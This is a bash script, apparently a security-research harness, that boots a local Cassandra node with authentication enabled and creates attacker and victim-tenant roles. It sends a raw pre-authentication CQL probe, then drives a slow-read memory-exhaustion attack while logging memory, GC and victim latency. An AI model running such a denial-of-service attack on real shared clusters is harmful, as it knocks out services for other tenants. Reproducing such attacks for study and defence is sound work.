#!/usr/bin/env bash
# C2 stage 3-b confirm (ms0604, 2026-11-23): one clean lifetime of condition S-A (shipped defaults, read thresholds
# off) with PasswordAuthenticator + CassandraAuthorizer + CassandraRoleManager, attack through a data role only.
# Adapted from the case harness (victim-ctl.sh + run-arm.sh): everything runs on the node (victim JVM, attacker
# client, victim-tenant client), no flush (nodetool is not a client step), roles/schema by the superuser via cqlsh.
#   run-3b.sh <label> [heap=2G] [direct=3982M] [steps=16:120] [cap=150] [drainKBps=2048]
set -uo pipefail
L=$1 HEAP=${2:-2G} DIRECT=${3:-3982M} SP=${4:-16:120} SS=${5:-150} SK=${6:-2048}
ROOT=/mydata/s4/3b-C2; H=$ROOT/harness; BASE=/mydata/s4/cassandra-base; BUILD=$ROOT/cassandra
R=$ROOT/runs/$L; IP=127.0.0.1
J=$BUILD/build/lib/jars
CP="$ROOT/loadcls:$J/cassandra-driver-core-3.12.1-shaded.jar:$J/guava-32.0.1-jre.jar:$J/metrics-core-4.2.28.jar:$BUILD/lib/*"
ATK_U=atk ATK_P=atk-pw-3b VIC_U=tenant VIC_P=tenant-pw-3b
log(){ echo "[$(date -u '+%FT%TZ')] $*"; }
su_cql(){ timeout 60 "$BUILD/bin/cqlsh" $IP -u cassandra -p cassandra -e "$1"; }
as_cql(){ timeout 60 "$BUILD/bin/cqlsh" $IP -u "$1" -p "$2" -e "$3"; }
alive(){ kill -0 "$(cat "$R/cass.pid")" 2>/dev/null && echo ALIVE || echo DEAD; }
reading(){
  local p nm oth tot rss last; p=$(cat "$R/cass.pid")
  nm=$(timeout 20 jcmd "$p" VM.native_memory summary 2>/dev/null)
  oth=$(echo "$nm" | awk '/^-  *Other \(reserved=/{gsub(/[^0-9 ]/," ",$0); split($0,a," "); print a[2]; exit}')
  tot=$(echo "$nm" | awk '/^Total: reserved=/{gsub(/[^0-9 ]/," ",$0); split($0,a," "); print a[2]; exit}')
  rss=$(awk '/VmRSS/{print $2}' /proc/"$p"/status 2>/dev/null); last=$(grep -v ERR "$R/samples.csv" 2>/dev/null | tail -1)
  echo "$(date -u +%s),$1,nmtOtherKB=${oth:-NA},nmtTotalKB=${tot:-NA},rssKB=${rss:-NA},$last" | tee -a "$R/readings.csv"
}

log "3B $L heap=$HEAP direct=$DIRECT steps=$SP cap=$SS drain=${SK}KiB/s/conn"
pgrep -f CassandraDaemon >/dev/null && { log "REFUSE: a CassandraDaemon is already running"; pgrep -af CassandraDaemon | cut -c1-150; exit 1; }
[ -d "$BUILD" ] || { cp -a "$BASE" "$BUILD" && log "copied $BASE -> $BUILD"; }
rm -rf "$ROOT/node"; mkdir -p "$ROOT/node"/{data,commitlog,hints,saved_caches,cdc_raw} "$R/logs"
rm -rf "$R/conf"; cp -r "$BASE/conf" "$R/conf"; y=$R/conf/cassandra.yaml
sed -i \
  -e "s|^# data_file_directories:|data_file_directories:|" \
  -e "s|^#     - /var/lib/cassandra/data|    - $ROOT/node/data|" \
  -e "s|^# commitlog_directory: /var/lib/cassandra/commitlog|commitlog_directory: $ROOT/node/commitlog|" \
  -e "s|^# hints_directory: /var/lib/cassandra/hints|hints_directory: $ROOT/node/hints|" \
  -e "s|^# saved_caches_directory: /var/lib/cassandra/saved_caches|saved_caches_directory: $ROOT/node/saved_caches|" \
  -e "s|^# cdc_raw_directory: /var/lib/cassandra/cdc_raw|cdc_raw_directory: $ROOT/node/cdc_raw|" \
  -e "s|^authenticator: AllowAllAuthenticator|authenticator: PasswordAuthenticator|" \
  -e "s|^authorizer: AllowAllAuthorizer|authorizer: CassandraAuthorizer|" \
  -e "s|^role_manager: CassandraRoleManager|role_manager: CassandraRoleManager|" \
  "$y"
diff "$BASE/conf/cassandra.yaml" "$y" > "$R/yaml.diff"
echo "label=$L build=$BUILD heap=$HEAP direct=$DIRECT start=$(date -u +%FT%TZ) host=$(hostname -s)" > "$R/run.meta"
sha256sum "$BUILD"/build/apache-cassandra-*.jar >> "$R/run.meta" 2>&1
CASSANDRA_CONF=$R/conf CASSANDRA_LOG_DIR=$R/logs MAX_HEAP_SIZE=$HEAP MAX_DIRECT_MEMORY_SIZE=$DIRECT CASSANDRA_HEAPDUMP_DIR=$R \
JVM_EXTRA_OPTS="-XX:NativeMemoryTracking=summary -Xlog:gc=info,safepoint=info:file=$R/gc.log:time,uptime,level,tags:filecount=20,filesize=20m" \
  setsid nohup "$BUILD/bin/cassandra" -f > "$R/stdout.log" 2>&1 < /dev/null &
echo $! > "$R/cass.pid"; sleep 3; log "started pid $(cat "$R/cass.pid")"
ok=0; for i in $(seq 1 90); do grep -q "Starting listening for CQL clients" "$R/logs/system.log" 2>/dev/null && { ok=1; break; }; [ "$(alive)" = DEAD ] && break; sleep 2; done
[ $ok = 1 ] || { log "not ready"; exit 1; }
ps -o args= -p "$(cat "$R/cass.pid")" | tr ' ' '\n' | grep -E '^-Xm[sx]|MaxDirect|NativeMemory|HeapDump|OnOutOfMemory' | tr '\n' ' ' | tee -a "$R/run.meta"; echo
grep -h "authenticator=\|Node configuration" "$R/logs/system.log" | grep -o "authenticator=[^;]*;\|authorizer=[^;]*;\|role_manager=[^;]*;" | sort -u | tr '\n' ' ' | tee -a "$R/run.meta"; echo
setsid nohup java -Xmx64m -cp "$H" C2Sampler "$R/samples.csv" "$R/sampler.stop" 1000 > "$R/sampler.out" 2>&1 < /dev/null &
echo $! > "$R/sampler.pid"
# --- superuser: roles, admin schema, grants (only these) ---
for i in $(seq 1 30); do su_cql "SELECT role FROM system_auth.roles" > /dev/null 2>&1 && break; sleep 2; done
{
log "superuser setup"
su_cql "CREATE ROLE $ATK_U WITH LOGIN = true AND PASSWORD = '$ATK_P';
CREATE ROLE $VIC_U WITH LOGIN = true AND PASSWORD = '$VIC_P';
CREATE KEYSPACE c2 WITH replication = {'class':'SimpleStrategy','replication_factor':1};
CREATE TABLE c2.t (pk int, ck int, v blob, PRIMARY KEY (pk, ck));
CREATE KEYSPACE vk WITH replication = {'class':'SimpleStrategy','replication_factor':1};
CREATE TABLE vk.kv (k int PRIMARY KEY, v blob);
GRANT SELECT ON TABLE c2.t TO $ATK_U;
GRANT MODIFY ON TABLE c2.t TO $ATK_U;
GRANT SELECT ON TABLE vk.kv TO $VIC_U;
GRANT MODIFY ON TABLE vk.kv TO $VIC_U;"
su_cql "LIST ROLES; LIST ALL PERMISSIONS OF $ATK_U; LIST ALL PERMISSIONS OF $VIC_U;"
log "attacker privilege checks (expected: Unauthorized)"
as_cql $ATK_U $ATK_P "SELECT * FROM vk.kv LIMIT 1;" 2>&1 | tail -1
as_cql $ATK_U $ATK_P "CREATE KEYSPACE atkks WITH replication = {'class':'SimpleStrategy','replication_factor':1};" 2>&1 | tail -1
as_cql $ATK_U $ATK_P "ALTER TABLE c2.t WITH comment='x';" 2>&1 | tail -1
log "pre-auth check: QUERY before AUTH_RESPONSE (expected: error, no rows)"
python3 - <<'EOF'
import socket, struct
s = socket.create_connection(('127.0.0.1', 9042), timeout=5)
f = lambda st, op, b: struct.pack('>BBhBi', 4, 0, st, op, len(b)) + b
m = struct.pack('>H', 1) + struct.pack('>H', 11) + b'CQL_VERSION' + struct.pack('>H', 5) + b'3.0.0'
s.sendall(f(0, 1, m)); h = s.recv(9); op = h[4]; s.recv(struct.unpack('>i', h[5:9])[0])
q = b'SELECT v FROM c2.t WHERE pk=0'
s.sendall(f(1, 7, struct.pack('>i', len(q)) + q + struct.pack('>HB', 1, 0)))
h = s.recv(9); ln = struct.unpack('>i', h[5:9])[0]; b = b''
while len(b) < ln:
    c = s.recv(ln - len(b))
    if not c: break
    b += c
print('pre-auth: STARTUP ->', 'AUTHENTICATE' if op == 3 else op, '; QUERY -> opcode', h[4], 'len', ln, b[6:140].decode(errors='replace'))
EOF
} > "$R/auth-setup.txt" 2>&1
cat "$R/auth-setup.txt"
# --- attacker (data role): writes its own 3.5 MiB partitions through MODIFY, one read through SELECT ---
log "attacker load (as $ATK_U)"
java -Xmx8g -XX:MaxDirectMemorySize=4g -Dc2.user=$ATK_U -Dc2.pass=$ATK_P -cp "$CP" -Dlogback.configurationFile=$H/logback-load.xml C2Load load $IP 64 56 65536 0 2>&1 | tail -2
java -Xmx1g -Dc2.user=$ATK_U -Dc2.pass=$ATK_P -cp "$CP" -Dlogback.configurationFile=$H/logback-load.xml C2Load one $IP 0 2>&1 | tail -1
sleep 5; timeout 60 jcmd "$(cat "$R/cass.pid")" GC.run > /dev/null 2>&1; sleep 3; reading base | cut -c1-200
# --- victim tenant: steady 10 ops/s from 60 s before the attack to 60 s after the endpoint / attack end ---
C2_USER=$VIC_U C2_PASS=$VIC_P setsid nohup python3 "$H/victim.py" $IP 10 900 2 > "$R/victim.csv" 2> "$R/victim.err" < /dev/null &
echo $! > "$R/victim.pid"; log "victim client started"
sleep 60
log "ATTACK START (as $ATK_U): 64 conns x ${SP} outstanding, drain ${SK} KiB/s/conn"
ta=$(date +%s); echo "attack_start=$ta" >> "$R/run.meta"
( cd "$R"; C2_USER=$ATK_U C2_PASS=$ATK_P setsid nohup python3 "$H/slowread.py" $IP 64 "$SP" $SS $SK 65536 > client.csv 2> client.err < /dev/null & echo $! > client.pid )
dead=0; n=0
while true; do
  sleep 2; n=$((n+1))
  if [ "$(alive)" != ALIVE ]; then log "VICTIM NODE DEAD at +$(( $(date +%s) - ta ))s"; echo "dead_detected=$(date +%s)" >> "$R/run.meta"; dead=1; break; fi
  [ $n = 3 ] && timeout 15 "$BUILD/bin/cqlsh" $IP -u cassandra -p cassandra -e "SELECT address, port, username, protocol_version, request_count FROM system_views.clients;" > "$R/clients-view.txt" 2>&1 &
  [ $((n % 5)) = 0 ] && { reading "t+$(( $(date +%s) - ta ))" | cut -c1-200; tail -1 "$R/client.csv"; }
  kill -0 "$(cat "$R/client.pid")" 2>/dev/null || break
done
p=$(cat "$R/client.pid"); for i in $(seq 1 40); do kill -0 $p 2>/dev/null || break; sleep 1; done; kill $p 2>/dev/null
grep SUMMARY "$R/client.csv"; tail -3 "$R/client.err"
if [ $dead = 0 ] && [ "$(alive)" = ALIVE ]; then sleep 10; reading end-pre | cut -c1-200; fi
log "victim tenant: 60 s after"; sleep 60
kill "$(cat "$R/victim.pid")" 2>/dev/null; sleep 1; tail -2 "$R/victim.csv"
log "OOM/GC check"
grep -h -m3 -B1 -A14 "java.lang.OutOfMemoryError\|OutOfDirectMemoryError" "$R/logs/system.log" "$R/stdout.log" 2>/dev/null | head -60
ls -la "$R" | grep -i "hprof\|hs_err" || true
python3 "$H/gcwin.py" "$R" | tee "$R/gcwin.txt"
# stop everything this run started
touch "$R/sampler.stop"; sleep 2; kill "$(cat "$R/sampler.pid")" 2>/dev/null
cp=$(cat "$R/cass.pid"); if kill -0 "$cp" 2>/dev/null; then kill "$cp"; for i in $(seq 1 40); do kill -0 "$cp" 2>/dev/null || break; sleep 1; done; kill -0 "$cp" 2>/dev/null && kill -9 "$cp"; fi
pkill -f "$H/slowread.py"; pkill -f "$H/victim.py"
log "stopped; java left: $(pgrep -af java | grep -v pgrep | cut -c1-100 || echo none)"
log "END $L"
